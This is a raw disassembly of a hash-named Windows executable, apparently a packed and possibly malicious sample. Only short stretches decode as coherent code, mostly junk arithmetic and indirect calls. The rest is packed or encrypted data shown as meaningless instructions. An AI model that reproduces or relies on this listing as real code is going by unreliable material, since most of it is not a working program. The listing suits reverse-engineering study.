
d2b623d99864aa55a136700ee9d29702815dd75f6f3506514d3f055b7aaa3417.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428257,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x4282ff,0x0
  401016:	mov    DWORD PTR ds:0x4282cf,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42821f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x4282ff,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d54
  40104b:	mov    ecx,DWORD PTR ds:0x428387
  401051:	sub    DWORD PTR ds:0x42823b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428267
  40105e:	and    DWORD PTR ds:0x428223,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x4281af
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x4282a7
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42835f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x42828b
  401089:	mov    edx,DWORD PTR ds:0x42838b
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x4282ef,ebx
  40109a:	and    DWORD PTR ds:0x428237,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx+0x48befcb3]
  4010b6:	add    al,0x0
  4010b8:	mov    esi,0x18181818
  4010bd:	sahf   
  4010be:	adc    bl,BYTE PTR [eax]
  4010c0:	sbb    BYTE PTR [eax],al
  4010c2:	scas   al,BYTE PTR es:[edi]
  4010c3:	lods   eax,DWORD PTR ds:[esi]
  4010c4:	clc    
  4010c5:	ror    BYTE PTR [esi-0x7064e10],0xe6
  4010cc:	cs or  dl,bh
  4010cf:	adc    DWORD PTR [ecx+0x17f91910],esi
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    DWORD PTR [edx],ebx
  40111b:	add    DWORD PTR [esi+ebx*1],ebp
  40111e:	mov    ebx,0x6513718d
  401123:	and    al,0xa3
  401125:	int    0x4e
  401127:	mov    bh,0x8d
  401129:	out    dx,al
  40112a:	in     eax,0x3c
  40112c:	xchg   BYTE PTR ds:0x39004482,bh
  401132:	(bad)  
  401133:	cli    
  401134:	pop    ebp
  401135:	not    BYTE PTR [edx]
  401137:	pop    ebp
  401138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401139:	stos   DWORD PTR es:[edi],eax
  40113a:	out    0xa7,eax
  40113c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40113d:	pushf  
  40113e:	popf   
  40113f:	xchg   edi,eax
  401140:	dec    edi
  401141:	cdq    
  401142:	sar    BYTE PTR [eax-0x3d7a0810],cl
  401148:	pop    edi
  401149:	xchg   ebp,eax
  40114a:	cld    
  40114b:	pushf  
  40114c:	sub    al,0x67
  40114e:	mov    edi,0x4c425235
  401153:	enter  0x91ca,0x14
  401157:	mov    bh,0x9d
  401159:	add    al,0xa7
  40115b:	or     edx,DWORD PTR [edi-0x39784273]
  401161:	iret   
  401162:	mov    esp,0x5798c6de
  401167:	jns    0x4010fc
  401169:	mov    ds:0x88f58681,al
  40116e:	push   cs
  40116f:	loopne 0x401106
  401171:	xchg   esi,eax
  401172:	out    0x14,eax
  401174:	pop    eax
  401175:	pop    edi
  401176:	(bad)  
  401177:	scas   al,BYTE PTR es:[edi]
  401178:	and    bl,BYTE PTR [esi+0x463c1ccf]
  40117e:	inc    eax
  40117f:	mov    ds:0x2e4d813b,eax
  401184:	out    dx,al
  401185:	mov    esi,ecx
  401187:	and    ebx,esp
  401189:	and    al,bl
  40118b:	(bad)  
  40118c:	sbb    eax,0x30f0cbe
  401191:	sub    dh,ah
  401193:	test   al,0x88
  401195:	cmp    dh,BYTE PTR [eax+0x56]
  401198:	mov    BYTE PTR [ebx-0x7fe015c7],dl
  40119e:	aam    0x2d
  4011a0:	ins    DWORD PTR es:[edi],dx
  4011a1:	mov    ch,0x70
  4011a3:	adc    dl,BYTE PTR [esp+ecx*2]
  4011a6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011a8:	bound  eax,QWORD PTR [ebp-0x2b1240c6]
  4011ae:	lods   al,BYTE PTR ds:[esi]
  4011af:	mov    cl,0xf1
  4011b1:	jbe    0x4011a8
  4011b3:	stos   DWORD PTR es:[edi],eax
  4011b4:	inc    ebp
  4011b5:	js     0x401153
  4011b7:	pushf  
  4011b8:	pop    ecx
  4011b9:	cs pop es
  4011bb:	inc    esi
  4011bc:	jns    0x401143
  4011be:	ret    0x42c9
  4011c1:	jo     0x401226
  4011c3:	inc    edi
  4011c4:	lods   al,BYTE PTR ds:[esi]
  4011c5:	xor    BYTE PTR [ebx],ah
  4011c7:	mov    eax,ds:0x80992c0d
  4011cc:	xlat   BYTE PTR ds:[ebx]
  4011cd:	les    edi,FWORD PTR [edi+0x1f3646bc]
  4011d3:	add    eax,0x753badf5
  4011d8:	and    BYTE PTR [edi+0x66],cl
  4011db:	cmp    eax,0xb3fdf21a
  4011e0:	imul   esp,DWORD PTR [ecx-0x5d],0x23
  4011e4:	push   ecx
  4011e5:	cmp    al,0xf8
  4011e7:	xor    bh,bh
  4011e9:	mov    DWORD PTR ds:0x7c3e4fcb,esi
  4011ef:	sbb    dl,BYTE PTR [esi+ebp*2]
  4011f2:	cmp    cl,BYTE PTR cs:[ebx+0x1493fcbb]
  4011f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011fa:	or     ecx,DWORD PTR [edi-0x6b]
  4011fd:	push   0x4b3a53f
  401202:	cmp    cl,al
  401204:	sahf   
  401205:	xor    edx,DWORD PTR [ebx-0x25fe7e92]
  40120b:	cmp    edi,DWORD PTR [bx+di-0xcae]
  401210:	pushf  
  401211:	add    BYTE PTR [ebx+0x33],dl
  401214:	in     al,dx
  401215:	lods   eax,DWORD PTR ds:[esi]
  401216:	mov    edx,0x7ed8465d
  40121b:	mov    eax,ds:0x53ec2747
  401220:	adc    DWORD PTR [ebp-0x63],0x83529a5d
  401227:	fsub   st(7),st
  401229:	outs   dx,DWORD PTR ds:[esi]
  40122a:	call   0x387f9177
  40122f:	xor    DWORD PTR [esi+0x6f49eda5],edi
  401235:	xor    ecx,DWORD PTR [ebp-0x28d5cedf]
  40123b:	leave  
  40123c:	mov    ds:0x3354272c,eax
  401241:	cmp    bh,BYTE PTR [esi+0x2e]
  401244:	adc    dh,BYTE PTR [esi-0x74]
  401247:	scas   al,BYTE PTR es:[edi]
  401248:	push   ebp
  401249:	fisub  WORD PTR [edx]
  40124b:	dec    edx
  40124c:	aas    
  40124d:	xchg   edx,eax
  40124e:	mov    dh,BYTE PTR [eax]
  401250:	push   esi
  401251:	ret    
  401252:	inc    di
  401254:	call   0x7735:0x3012a7a
  40125b:	lahf   
  40125c:	jge    0x401293
  40125e:	adc    BYTE PTR [ecx+0x1e65bbae],bl
  401264:	outs   dx,BYTE PTR ds:[esi]
  401265:	push   edi
  401266:	cmp    edx,DWORD PTR [esp+eiz*2-0x75]
  40126a:	pop    esp
  40126b:	shl    DWORD PTR [esi],0xa4
  40126e:	pop    esi
  40126f:	jecxz  0x4011fe
  401271:	in     eax,0x43
  401273:	cmp    DWORD PTR [eax-0x36],edx
  401276:	add    eax,0x9f1b0d47
  40127b:	dec    DWORD PTR [edi+0x65]
  40127e:	push   edx
  40127f:	test   BYTE PTR [ebx-0x36d8931c],0x9f
  401286:	daa    
  401287:	ins    BYTE PTR es:[edi],dx
  401288:	hlt    
  401289:	jb     0x4012f8
  40128b:	or     ebp,edi
  40128d:	xor    eax,0xb4a1ab55
  401292:	rcl    DWORD PTR [eax+0x239a4eea],0x75
  401299:	pop    ds
  40129a:	push   eax
  40129b:	(bad)  [eax-0x75]
  40129e:	je     0x401303
  4012a0:	mov    esi,0xf70d8814
  4012a5:	mov    al,0xaa
  4012a7:	cmp    eax,0x49f3f8f5
  4012ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ad:	sbb    eax,0x63f2d548
  4012b2:	aaa    
  4012b3:	scas   al,BYTE PTR es:[edi]
  4012b4:	adc    BYTE PTR [ebx-0x994304c],dh
  4012ba:	pop    ds
  4012bb:	push   ds
  4012bc:	aad    0x92
  4012be:	sahf   
  4012bf:	and    dl,BYTE PTR [ecx+edi*1+0x3fc5a762]
  4012c6:	adc    esp,edx
  4012c8:	hlt    
  4012c9:	jo     0x4012f7
  4012cb:	test   DWORD PTR [ecx-0x1b546b7e],eax
  4012d1:	add    al,0xac
  4012d3:	mov    BYTE PTR [ebx+0x5d5bac5d],dh
  4012d9:	repnz icebp 
  4012db:	push   ebp
  4012dc:	cli    
  4012dd:	xor    BYTE PTR [edx+0x4734ab9c],bh
  4012e3:	xor    ch,bl
  4012e5:	sahf   
  4012e6:	inc    edi
  4012e7:	retf   
  4012e8:	std    
  4012e9:	aam    0x3c
  4012eb:	jle    0x401312
  4012ed:	ficom  WORD PTR [eax+0x42266ccb]
  4012f3:	mov    eax,ds:0x17c3e61a
  4012f8:	pusha  
  4012f9:	jl     0x401376
  4012fb:	in     eax,dx
  4012fc:	(bad)  
  4012fd:	jmp    FWORD PTR [ecx+ecx*1]
  401300:	add    ebp,eax
  401302:	jecxz  0x401367
  401304:	test   BYTE PTR [ecx-0x20b4a656],0x9e
  40130b:	aaa    
  40130c:	inc    eax
  40130d:	push   esp
  40130e:	mul    edi
  401310:	jae    0x401326
  401312:	sbb    eax,0x40658973
  401317:	loope  0x401363
  401319:	mov    dl,0x0
  40131b:	fdivr  QWORD PTR [edx-0x4b562765]
  401321:	and    BYTE PTR [edi-0x34],bh
  401324:	push   esp
  401325:	int    0xda
  401327:	test   BYTE PTR [ebx],dh
  401329:	pop    es
  40132a:	rol    BYTE PTR [edx+0x73],0xf2
  40132e:	cli    
  40132f:	daa    
  401330:	inc    edx
  401331:	xchg   ebp,eax
  401332:	dec    esp
  401333:	data16 xlat BYTE PTR ds:[ebx]
  401335:	fild   WORD PTR [edi]
  401337:	push   0x4c434584
  40133c:	pop    edi
  40133d:	mov    eax,esp
  40133f:	dec    edx
  401340:	push   ss
  401341:	mov    esi,0x40d5886c
  401346:	repnz pusha 
  401348:	jle    0x401301
  40134a:	int    0x1c
  40134c:	adc    BYTE PTR [edi],0xd0
  40134f:	jge    0x40130f
  401351:	ja     0x401316
  401353:	popa   
  401354:	cmp    eax,DWORD PTR [ecx+0x55c02dfd]
  40135a:	adc    cl,ah
  40135c:	xchg   ecx,eax
  40135d:	outs   dx,DWORD PTR ds:[esi]
  40135e:	(bad)  
  40135f:	sti    
  401360:	mov    eax,DWORD PTR [esp+edx*4+0x34121a4b]
  401367:	int3   
  401368:	(bad)  
  401369:	stos   DWORD PTR es:[edi],eax
  40136a:	add    al,0xc2
  40136c:	test   esi,0xefe3c688
  401372:	sub    ebx,DWORD PTR [edx-0x432d1140]
  401378:	cmc    
  401379:	sub    ch,ch
  40137b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40137c:	push   eax
  40137d:	sbb    eax,0xac890d81
  401382:	mov    eax,0x608093b3
  401387:	imul   edi,DWORD PTR [ebx+0x590c79df],0xd2912c0d
  401391:	not    ebp
  401393:	jecxz  0x401353
  401395:	cmp    BYTE PTR [esi],dh
  401397:	fmul   st,st(7)
  401399:	loopne 0x401417
  40139b:	pop    esp
  40139c:	inc    ebx
  40139d:	icebp  
  40139e:	imul   esi,DWORD PTR [edx],0xfffffff3
  4013a1:	push   eax
  4013a2:	cli    
  4013a3:	add    esi,ebp
  4013a5:	pop    edx
  4013a6:	addr16 jg 0x4013f4
  4013a9:	ds fadd st,st(0)
  4013ac:	int3   
  4013ad:	(bad)  
  4013ae:	in     al,0x49
  4013b0:	xor    DWORD PTR [ebx-0x19],esi
  4013b3:	daa    
  4013b4:	stos   BYTE PTR es:[edi],al
  4013b5:	call   0xf6c2c80a
  4013ba:	mov    ds:0x5ed5dc31,eax
  4013bf:	nop
  4013c0:	inc    esi
  4013c1:	sub    DWORD PTR [ecx+eiz*4-0x4da8260e],ebp
  4013c8:	cmp    dh,dh
  4013ca:	sar    DWORD PTR [eax],1
  4013cc:	xchg   ebp,eax
  4013cd:	pop    edi
  4013ce:	adc    esi,DWORD PTR [edi+0x21]
  4013d1:	mov    ebx,0xd43e1a64
  4013d6:	xor    BYTE PTR [edx+0x2f],dh
  4013d9:	xor    cl,BYTE PTR [ebp+0x4c]
  4013dc:	mov    ds:0x9796453d,al
  4013e1:	mov    ecx,DWORD PTR [edi-0x6bb23f2e]
  4013e7:	and    ebx,esi
  4013e9:	repz out dx,eax
  4013eb:	mov    esi,0x6db899a1
  4013f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013f1:	xor    eax,0xfdc1a5ee
  4013f6:	xchg   ebx,eax
  4013f7:	rcl    bl,cl
  4013f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013fa:	in     eax,0x3d
  4013fc:	ins    BYTE PTR es:[edi],dx
  4013fd:	and    eax,0xfbca8b25
  401402:	push   cs
  401403:	jne    0x40139f
  401405:	mov    WORD PTR [edi+0x29],gs
  401408:	test   DWORD PTR [edi+ebp*2+0x61],esp
  40140c:	push   cs
  40140d:	nop
  40140e:	sub    dh,bl
  401410:	test   al,0x5a
  401412:	jns    0x401430
  401414:	ret    
  401415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401416:	push   ebp
  401417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401418:	jp     0x401419
  40141a:	jg     0x401483
  40141c:	xlat   BYTE PTR ds:[ebx]
  40141d:	xchg   esi,eax
  40141e:	repnz mov esi,fs
  401421:	in     eax,dx
  401422:	mov    eax,ds:0xf65b3b43
  401427:	pop    eax
  401428:	stos   BYTE PTR es:[edi],al
  401429:	and    eax,ecx
  40142b:	icebp  
  40142c:	scas   eax,DWORD PTR es:[edi]
  40142d:	and    ah,cl
  40142f:	and    al,0x79
  401431:	retf   
  401432:	call   0xd9a96763
  401437:	dec    ebx
  401438:	loope  0x401456
  40143a:	mov    es,edi
  40143c:	push   ds
  40143d:	mov    edx,0xb2a7ee67
  401442:	adc    dl,BYTE PTR [ecx]
  401444:	ins    DWORD PTR es:[edi],dx
  401445:	sub    al,BYTE PTR [ecx+eiz*8]
  401448:	dec    ebx
  401449:	jmp    0x563:0x3cfd0fab
  401450:	add    DWORD PTR [ebp-0x2626cdd0],esp
  401456:	mov    ecx,0x7105e0fd
  40145b:	jp     0x401455
  40145d:	or     ah,BYTE PTR [ecx-0x51d94edd]
  401463:	mov    BYTE PTR [esi+0x19],bh
  401466:	xchg   ebx,eax
  401467:	adc    bl,BYTE PTR [ebp+0x646aca47]
  40146d:	xchg   ebx,eax
  40146e:	xchg   ebx,eax
  40146f:	and    DWORD PTR ds:[eax-0x5f],ebx
  401473:	pop    esi
  401474:	out    dx,al
  401475:	or     cl,BYTE PTR [ecx+0x14]
  401478:	fwait
  401479:	mov    BYTE PTR [edi],0xd7
  40147c:	jbe    0x401476
  40147e:	mov    bh,0xd6
  401480:	ret    
  401481:	jbe    0x40140e
  401483:	dec    ebp
  401484:	mov    ah,0x8b
  401486:	push   ebp
  401487:	mov    al,0x2b
  401489:	ret    0x1589
  40148c:	dec    edi
  40148d:	add    DWORD PTR [edx+0x0],0x57
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x42828b
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x4282db,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42820b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428233,0x0
  4014da:	mov    DWORD PTR ds:0x42820f,ecx
  4014e0:	mov    DWORD PTR ds:0x4282d3,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42814b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428233,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d58
  40151c:	mov    edx,DWORD PTR ds:0x4282ab
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428323
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x42817f
  401537:	mov    edi,DWORD PTR ds:0x428327
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp-0x5e6fdf90]
  401569:	jo     0x401509
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x5f181812],bl
  401573:	jmp    FWORD PTR [esi]
  401575:	xor    BYTE PTR [ecx+edi*4-0x34dc5eb1],dh
  40157c:	inc    esi
  40157d:	(bad)  
  40157e:	fwait
  40157f:	int    0x85
  401581:	mov    edi,0x1e02647f
  401586:	cmp    cl,cl
  401588:	dec    esi
  401589:	fwait
  40158a:	xchg   edi,eax
  40158b:	sbb    al,0x6a
  40158d:	aaa    
  40158e:	jmp    0x4015e8
  401590:	pop    edi
  401591:	xor    eax,0xe9fd6398
  401596:	or     DWORD PTR [ebp-0xc],0xf2587790
  40159d:	(bad)  
  40159e:	(bad)  
  4015a0:	adc    DWORD PTR [edx],ecx
  4015a2:	cmp    al,0x3b
  4015a4:	push   ecx
  4015a5:	or     eax,edx
  4015a7:	add    BYTE PTR [eax+ebx*2],bl
  4015aa:	ret    
  4015ab:	inc    ebx
  4015ac:	adc    eax,0x4eb08517
  4015b1:	pushf  
  4015b2:	leave  
  4015b3:	lock cmp edx,ecx
  4015b6:	jns    0x4015e3
  4015b8:	aaa    
  4015b9:	fistp  QWORD PTR [edi-0x2c]
  4015bc:	dec    esi
  4015bd:	ror    BYTE PTR [eax+0x1adcbf37],1
  4015c3:	mov    esp,0x330865c2
  4015c8:	mov    esp,0x89b46c20
  4015cd:	and    DWORD PTR [eax+0x1fc0d66a],edx
  4015d3:	sar    BYTE PTR [edx+0x4],0x2a
  4015d7:	mov    ecx,0xa27be4bc
  4015dc:	or     dl,0xa2
  4015df:	mov    eax,0x4d198aa5
  4015e4:	stos   DWORD PTR es:[edi],eax
  4015e5:	jnp    0x401592
  4015e7:	enter  0xa643,0x4c
  4015eb:	and    edx,DWORD PTR [edi+0xc4c1e45]
  4015f1:	ss (bad) 
  4015f3:	push   edx
  4015f4:	xchg   ebp,eax
  4015f5:	sub    dl,BYTE PTR [edx+0x2b]
  4015f8:	outs   dx,DWORD PTR ds:[esi]
  4015f9:	or     al,0x90
  4015fb:	lock adc DWORD PTR [ecx+ebx*2-0x167d1ade],eax
  401603:	cli    
  401604:	inc    edx
  401605:	sbb    al,BYTE PTR [esi+0x51bd9f8e]
  40160b:	mov    eax,ds:0xa37a6304
  401610:	and    eax,0x363fc747
  401615:	lds    eax,FWORD PTR [ebp+ebp*4-0x4de52e3b]
  40161c:	xchg   esp,eax
  40161d:	cmp    edi,DWORD PTR [esi+esi*2]
  401620:	fisttp DWORD PTR [ebx+ebx*8-0x11a64c1b]
  401627:	pop    eax
  401628:	clc    
  401629:	push   0x31
  40162b:	fmul   QWORD PTR [edx+ebp*4-0xf6455ea]
  401632:	add    edx,DWORD PTR [ecx+0x52e04127]
  401638:	lds    esp,FWORD PTR [ebp-0x3b]
  40163b:	or     al,ch
  40163d:	xor    edx,esi
  40163f:	js     0x401699
  401641:	xor    BYTE PTR [ebx-0x1e],ch
  401644:	mov    ds:0xa733d2e9,eax
  401649:	or     edx,DWORD PTR [eax]
  40164b:	add    esi,esp
  40164d:	push   ss
  40164e:	xchg   DWORD PTR [ecx],esi
  401650:	inc    eax
  401651:	mov    ds:0x202fc1c6,al
  401656:	ja     0x4015e0
  401658:	jle    0x4015f1
  40165a:	jl     0x40169f
  40165c:	xchg   edx,eax
  40165d:	and    DWORD PTR [ebx+edx*8+0x29],ebx
  401661:	and    dh,al
  401663:	pushf  
  401664:	pop    esp
  401665:	cli    
  401666:	ins    BYTE PTR es:[edi],dx
  401667:	lahf   
  401668:	mov    WORD PTR [edi+edx*8],fs
  40166b:	sbb    eax,0xc5c788f6
  401670:	push   eax
  401671:	test   ebx,ecx
  401673:	out    dx,al
  401674:	push   edx
  401675:	inc    edi
  401676:	(bad)  
  401677:	push   ebx
  401678:	jo     0x401622
  40167a:	sub    ecx,esi
  40167c:	pop    esi
  40167d:	mov    WORD PTR [edi-0x64],sp
  401681:	int3   
  401682:	add    DWORD PTR [ecx-0x7954f466],esi
  401688:	mov    ch,0x7b
  40168a:	adc    al,0x81
  40168c:	mov    esi,0x307afc42
  401691:	scas   al,BYTE PTR es:[edi]
  401692:	push   ebx
  401693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401694:	add    ebp,DWORD PTR [edx+0x8]
  401697:	xchg   al,cl
  401699:	push   ebx
  40169a:	shr    DWORD PTR [ecx*4-0x2befbc60],1
  4016a1:	outs   dx,BYTE PTR ds:[esi]
  4016a2:	inc    ebp
  4016a3:	mov    ecx,0xac6d9930
  4016a8:	gs mov esi,0x9ee041ad
  4016ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016af:	pop    edx
  4016b0:	pop    ecx
  4016b1:	dec    edx
  4016b2:	mov    BYTE PTR [eax+eiz*4+0x3a],dl
  4016b6:	ror    BYTE PTR [eax+0x9],cl
  4016b9:	sub    eax,0xdcc79126
  4016be:	(bad)  
  4016bf:	sub    BYTE PTR [ebp+eax*1+0x16],ah
  4016c3:	test   al,0x30
  4016c5:	lea    ecx,[ecx]
  4016c7:	push   ecx
  4016c8:	jae    0x40165c
  4016ca:	jae    0x4016f4
  4016cc:	in     al,0x86
  4016ce:	sbb    al,0x44
  4016d0:	and    DWORD PTR [ebx-0x20975f4c],0x2eac92e7
  4016da:	and    bh,BYTE PTR [esi+ebp*4-0x451ca334]
  4016e1:	loop   0x4016cc
  4016e3:	cmp    eax,0x5ccd0a41
  4016e8:	mov    eax,ds:0x77fbe5a1
  4016ed:	add    ebx,DWORD PTR [eax+0x22f7778c]
  4016f3:	mov    dh,0x39
  4016f5:	out    dx,al
  4016f6:	or     DWORD PTR [ebx-0x2dd1ab77],0x2f1c176f
  401700:	out    0x1c,eax
  401702:	add    DWORD PTR [ebx+edx*2],eax
  401705:	add    BYTE PTR [esi],cl
  401707:	xchg   esi,eax
  401708:	mov    al,ds:0x5b7fccf8
  40170d:	ret    0x2459
  401710:	int    0x6d
  401712:	icebp  
  401713:	jge    0x40175e
  401715:	out    dx,eax
  401716:	cmc    
  401717:	xchg   ebp,eax
  401718:	adc    al,0x55
  40171a:	call   0x7e4b:0x8a6c9363
  401721:	scas   al,BYTE PTR es:[edi]
  401722:	lods   eax,DWORD PTR ds:[esi]
  401723:	adc    al,0xed
  401725:	cs inc edx
  401727:	out    0x1a,al
  401729:	outs   dx,BYTE PTR ds:[esi]
  40172a:	or     al,0x8d
  40172c:	cmp    eax,0x7ed45251
  401731:	push   eax
  401732:	adc    edi,DWORD PTR [edx+0x5a]
  401735:	xchg   ecx,eax
  401736:	outs   dx,DWORD PTR ds:[esi]
  401737:	or     ecx,DWORD PTR ds:0x86f87345
  40173d:	aam    0x47
  40173f:	sbb    BYTE PTR [ecx+eax*1],bh
  401742:	push   ss
  401743:	jl     0x401746
  401745:	push   edx
  401746:	sti    
  401747:	cmc    
  401748:	adc    eax,0xf469d018
  40174d:	fbld   TBYTE PTR [edi]
  40174f:	mov    ds:0x7147e61,eax
  401754:	pushf  
  401755:	pop    ss
  401756:	rcl    BYTE PTR [ebp+0x5bd2ec55],cl
  40175c:	rcr    BYTE PTR [edi+0x49],0xd0
  401760:	daa    
  401761:	(bad)  
  401762:	dec    edi
  401763:	add    bl,BYTE PTR [edi-0x7eb75e0]
  401769:	sub    bl,BYTE PTR [ecx+ebx*8-0x35]
  40176d:	sub    eax,0xb8afdb06
  401772:	jmp    0x40172b
  401774:	bound  ebx,QWORD PTR [edi]
  401776:	aad    0x6c
  401778:	jl     0x4017f4
  40177a:	repz jg 0x4017b1
  40177d:	aam    0x53
  40177f:	sbb    bh,BYTE PTR [ebx]
  401781:	cs mov al,0x5
  401784:	sub    DWORD PTR [ebx],edx
  401786:	xor    al,0xfd
  401788:	push   ecx
  401789:	dec    esp
  40178a:	fidivr WORD PTR [ebp+ebx*8-0x79f40b96]
  401791:	aas    
  401792:	pop    es
  401793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401794:	and    BYTE PTR [ecx+0x59],ch
  401797:	hlt    
  401798:	dec    ebp
  401799:	jbe    0x4017f8
  40179b:	xor    al,0xc4
  40179d:	mov    ecx,DWORD PTR [esi-0x5261f24d]
  4017a3:	pop    esi
  4017a4:	fucomi st,st(7)
  4017a6:	mov    edx,DWORD PTR [eax+ecx*1+0x936d675]
  4017ad:	cmp    ch,BYTE PTR [edx]
  4017af:	sti    
  4017b0:	and    al,0x60
  4017b2:	lods   al,BYTE PTR ds:[esi]
  4017b3:	pop    eax
  4017b4:	inc    BYTE PTR [edi-0x60]
  4017b7:	mov    esi,esp
  4017b9:	jbe    0x4017a3
  4017bb:	dec    ebx
  4017bc:	pop    ebx
  4017bd:	pop    esp
  4017be:	jb     0x4017af
  4017c0:	ss mov esi,0x183a2530
  4017c6:	sti    
  4017c7:	cmp    esi,DWORD PTR [ecx]
  4017c9:	inc    esp
  4017ca:	adc    al,0xe7
  4017cc:	push   ss
  4017cd:	push   es
  4017ce:	xchg   esp,eax
  4017cf:	cmp    DWORD PTR [edx+0x608f9f91],edx
  4017d5:	std    
  4017d6:	or     al,0x61
  4017d8:	add    eax,0x5c4e017f
  4017dd:	rcl    DWORD PTR [ebx-0x78],0xb6
  4017e1:	push   ds
  4017e2:	add    BYTE PTR [edi],dh
  4017e4:	adc    eax,0xc020c31b
  4017e9:	mov    ah,0x9b
  4017eb:	(bad)  
  4017ec:	rcl    DWORD PTR [edx+ecx*8-0x37],1
  4017f0:	jns    0x401850
  4017f2:	xor    BYTE PTR [edx],0xed
  4017f5:	push   ss
  4017f6:	dec    ebp
  4017f7:	add    dh,ah
  4017f9:	sub    al,0x6d
  4017fb:	std    
  4017fc:	(bad)  
  4017fd:	call   0xb2db:0xf42c8588
  401804:	jle    0x401842
  401806:	pop    edx
  401807:	aam    0xbc
  401809:	add    bl,bh
  40180b:	pusha  
  40180c:	(bad)  
  40180d:	cli    
  40180e:	dec    edi
  40180f:	dec    ecx
  401810:	push   cs
  401811:	xchg   ecx,eax
  401812:	xchg   esi,eax
  401813:	xchg   edx,eax
  401814:	out    dx,al
  401815:	xchg   edx,eax
  401816:	div    DWORD PTR [ebp-0x6d8c4713]
  40181c:	out    0x7,eax
  40181e:	mov    dl,0x77
  401820:	lahf   
  401821:	sbb    al,0x72
  401823:	or     DWORD PTR [edi],ecx
  401825:	bound  ebp,QWORD PTR [esi]
  401827:	or     eax,0x33509098
  40182c:	enter  0xcee5,0xd4
  401830:	xor    al,0x2b
  401832:	pop    ss
  401833:	xchg   ebx,eax
  401834:	ret    
  401835:	aad    0xd5
  401837:	sar    DWORD PTR [edi-0x6bbf7bfe],cl
  40183d:	popf   
  40183e:	mul    BYTE PTR [ecx]
  401840:	sti    
  401841:	pop    ds
  401842:	adc    cl,ah
